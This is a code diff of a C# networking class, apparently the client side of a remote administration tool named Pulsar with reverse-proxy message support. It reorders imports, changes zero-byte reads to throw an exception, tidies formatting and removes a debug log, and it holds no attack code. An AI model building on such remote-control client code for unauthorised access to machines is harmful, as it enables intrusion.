@@ -1,13 +1,10 @@
 ﻿using Pulsar.Client.ReverseProxy;
-using Pulsar.Common.Extensions;
 using Pulsar.Common.Messages;
-using Pulsar.Common.Messages.other;
-using Pulsar.Common.Messages.ReverseProxy;
 using Pulsar.Common.Networking;
+using Pulsar.Common.Extensions;
+using Pulsar.Common.Messages.Other;
 using System;
 using System.Collections.Generic;
-using System.Diagnostics;
-using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Security;
@@ -16,7 +13,7 @@ using System.Security.Authentication;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
-using System.Windows.Forms;
+using Pulsar.Common.Messages.Administration.ReverseProxy;
 
 namespace Pulsar.Client.Networking
 {
@@ -319,7 +316,7 @@ namespace Pulsar.Client.Networking
                 bytesTransferred = _stream.EndRead(result);
 
                 if (bytesTransferred <= 0)
-                    return;
+                    throw new Exception("no bytes transferred");
             }
             catch (NullReferenceException)
             {
@@ -517,24 +514,20 @@ namespace Pulsar.Client.Networking
         /// </summary>
         /// <typeparam name="T">The type of the message.</typeparam>
         /// <param name="message">The message to be sent.</param>
-        public void Send<T>(T message) where T : IMessage 
-        { 
-        
+        public void Send<T>(T message) where T : IMessage
+        {
             if (!Connected || message == null) return;
 
             lock (_sendBuffers)
             {
-
                 _sendBuffers.Enqueue(message);
 
                 lock (_sendingMessagesLock)
                 {
-
                     if (_sendingMessages) return;
 
                     _sendingMessages = true;
                     ThreadPool.QueueUserWorkItem(ProcessSendBuffers);
-
                 }
             }
         }
@@ -567,9 +560,8 @@ namespace Pulsar.Client.Networking
                     OnClientWrite(message, pw.WriteMessage(message));
                 }
             }
-            catch (Exception ex)
+            catch (Exception)
             {
-                Debug.WriteLine($"Exception: {ex.Message}");
                 Disconnect();
                 SendCleanup(true);
             }
